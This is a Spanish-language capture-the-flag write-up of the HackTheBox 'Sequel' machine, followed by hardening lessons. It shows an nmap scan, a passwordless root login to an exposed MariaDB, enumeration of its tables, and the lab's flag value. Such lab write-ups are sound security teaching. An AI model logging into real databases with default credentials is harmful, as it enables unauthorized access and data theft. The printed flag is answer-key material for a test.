# 🎯 Sequel (MySQL) — HackTheBox (Starting Point)

## Información General

| Campo | Detalle |
|-------|---------|
| **Plataforma** | HackTheBox — Starting Point |
| **Dificultad** | Muy Fácil |
| **OS** | Linux |
| **Tags** | `mysql` `mariadb` `weak-credentials` `database-enumeration` |

---

## Objetivo

Acceder remotamente a una instancia de MariaDB expuesta en red con credenciales débiles (usuario `root` sin contraseña), enumerar las bases de datos y extraer la flag almacenada en una tabla.

---

## Herramientas Utilizadas

- `nmap` — enumeración del puerto MySQL
- `mysql` — cliente de línea de comandos para interactuar con la base de datos

---

## Conceptos Clave

- **MySQL**: sistema gestor de bases de datos relacional de código abierto. Escucha por defecto en el **puerto 3306**.
- **MariaDB**: fork comunitario de MySQL, binariamente compatible. Es la versión que corre el objetivo.
- El símbolo `*` en SQL selecciona todas las columnas de una tabla.
- Toda consulta SQL debe terminar con `;`.
- El flag `-u` en el cliente MySQL especifica el usuario con el que conectarse.

---

## Metodología

### 1. Reconocimiento — Enumeración del puerto

```bash
nmap -sV 10.129.174.184
```

**Resultado:**
```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MariaDB (unauthorized)
```

El puerto 3306 está abierto y corre **MariaDB**. La etiqueta "unauthorized" indica que el servidor responde sin requerir autenticación inicial en la fase de handshake.

---

### 2. Acceso — Conexión con credenciales débiles

Se intenta conectar como `root` sin contraseña:

```bash
mysql -u root -h 10.129.174.184
```

```
Welcome to the MariaDB monitor.
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
MariaDB [(none)]>
```

El acceso es exitoso. Este es un caso clásico de **credenciales por defecto** — el usuario `root` sin contraseña es la configuración inicial de MariaDB si no se ejecuta el script de hardening post-instalación.

---

### 3. Enumeración — Exploración de la base de datos

**Listar todas las bases de datos:**

```sql
SHOW databases;
```

```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

Hay 4 bases de datos. Las tres comunes en cualquier instancia MySQL/MariaDB son `information_schema`, `mysql` y `performance_schema`. La base de datos **`htb`** es única en este host y el objetivo de la investigación.

**Seleccionar la base de datos objetivo:**

```sql
USE htb;
```

**Listar tablas:**

```sql
SHOW tables;
```

```
+--------------+
| Tables_in_htb|
+--------------+
| config       |
| users        |
+--------------+
```

**Examinar el contenido de las tablas:**

```sql
SELECT * FROM users;
```

```
| id | username | email              |
|----|----------|--------------------|
|  1 | admin    | admin@sequel.htb   |
|  2 | lara     | lara@sequel.htb    |
|  3 | sam      | sam@sequel.htb     |
|  4 | mary     | mary@sequel.htb    |
```

```sql
SELECT * FROM config;
```

```
| id | name                  | value                            |
|----|-----------------------|----------------------------------|
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
```

La flag se encontraba almacenada directamente en la tabla `config` bajo el campo `flag`.

---

## Flags

| Tipo | Hash |
|------|------|
| **Root Flag** | `7b4bec00d1a39e3dd4e021ec3d915da8` |

---

## Lecciones Aprendidas

1. **Nunca dejar bases de datos expuestas en red** sin autenticación. MySQL/MariaDB por defecto solo escucha en `localhost` — cambiar esto sin aplicar credenciales fuertes es una misconfiguration grave.
2. **Credenciales por defecto** (`root` sin contraseña) son el vector de ataque más simple y frecuente en bases de datos mal configuradas.
3. La enumeración sistemática de bases de datos (`SHOW databases` → `USE` → `SHOW tables` → `SELECT *`) es la metodología estándar para explorar una instancia de MySQL comprometida.
4. Información sensible (flags, credenciales, configuración) puede estar directamente en tablas de la base de datos — siempre revisar todas las tablas disponibles.
